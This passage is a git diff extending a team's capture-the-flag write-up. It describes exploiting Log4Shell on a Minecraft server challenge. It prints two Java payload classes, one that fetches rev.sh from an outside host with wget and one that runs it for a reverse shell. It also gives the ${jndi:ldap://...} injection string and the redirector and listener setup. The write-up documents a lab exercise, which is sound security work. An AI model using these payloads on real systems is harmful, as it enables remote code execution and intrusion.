@@ -53,6 +53,8 @@ The challenges were accessed by using remote kali virtual machines.
 
 - [Kali In The Browser (Guacamole)](https://www.kali.org/docs/general-use/guacamole-kali-in-browser/){: .image-process-crisp}
 
+**Note**: These challenges weren't completed alone by me, all of us in the team contributed in where we placed in the leader board and that's thanks to them.
+
 ### Smart Home
 
 #### NETWORK FIX
@@ -362,6 +364,111 @@ Hostname: env263.target02
 Port: 25565
 Server is running in offline mode.
 ```
+
+So this was nerve wrecking and helped us jump from 9/10th place to 6th at the last minute of the comptetition.
+
+**Solution**: Log4J bug obvious, but not the way to connect to it at
+first.
+
+Seemed like no way to connect to the server, couldn't get a client installed properly, so a decision to find a similar ctf challenge was made.
+
+Found this: https://ctftime.org/writeup/20489, which in turn linked to this nice CLI tool https://mccteam.github.io/.
+
+Having this installed, it was possible to connect to the server, not
+exactly as simple as this at the start, couldn't get it to connect.
+
+This was executed:
+
+```bash
+# After downloading the binary
+https://github.com/MCCTeam/Minecraft-Console-Client/releases/tag/20221004-85
+
+apt install dotnet-runtime-6
+
+# Run client
+./MinecraftClient "" "" env263.target02:25565
+```
+
+But... "Connection has been lost."
+
+![MCC connection lost](images/mcc-connection-lost.png){: .image-process-crisp}
+
+So what was the problem? It needed a username. There was a lot of 
+struggle, but it was this simple.
+
+None tried the exploit before and I was just as oblivious when attempting it, spent some good time mistyping jndi as jindi.
+
+![Mistyped jndi](images/jndi-typo.png){: .image-process-crisp}
+
+Once the `jndi` was properly typed, the response as handing and that's where we finally found that the exploit was possible.
+
+The exploit that will be used is from David Bombal video, you can
+find his repository here: https://github.com/davidbombal/log4jminecraft
+
+Athough the default payload was not working because of special character issues, it was ran 2 times. Once to get the reverse shell on the machine and second to run the reverse shell.
+
+First payload:
+
+```java
+public class Log4jRCE {
+
+    static {
+        
+        try {
+            java.lang.Runtime.getRuntime().exec("wget http://10.85.26.3:9001/rev.sh").waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public Log4jRCE(){
+        System.out.println("I am Log4jRCE from remote222!!!");
+    }
+}
+```
+
+Second payload:
+
+```java
+public class Log4jRCE {
+
+    static {
+        
+        try {
+            java.lang.Runtime.getRuntime().exec("bash rev.sh").waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public Log4jRCE(){
+        System.out.println("I am Log4jRCE from remote222!!!");
+    }
+}
+```
+
+Before triggering the payload a small setup was needed. 
+
+1. Run the java compile and exploit serve script.
+2. Run the reverse shell http serve script.
+3. Run the reverse shell listener
+4. Run the Log4JRCE redirection script - used to redirect LDAP requests to exploit serve script to transfer and execute the payload on target machine.
+
+After everything was setup, the following script was ran in the MC client to send the chat message
+
+```
+/send ${jndi:ldap://10.85.26.3:1389/Log4jRCE}
+```
+
+You will notice that the LDAP server is spammed, not sure what caused this, but had to kill the redirector just to not DoS the minecraft server.
+
+![Send jndi message and LDAP server](images/ldap-redirect-server.png){: .image-process-crisp}
+
+![HTTP servers and reverse shell listener](images/http-servers-running-with-listener.png){: .image-process-crisp}
+
+And after running the second payload, we are in!
+
+![Inside the minecraft server system](images/log4j-we-in.png){: .image-process-crisp}
 
 #### INFECTION
 
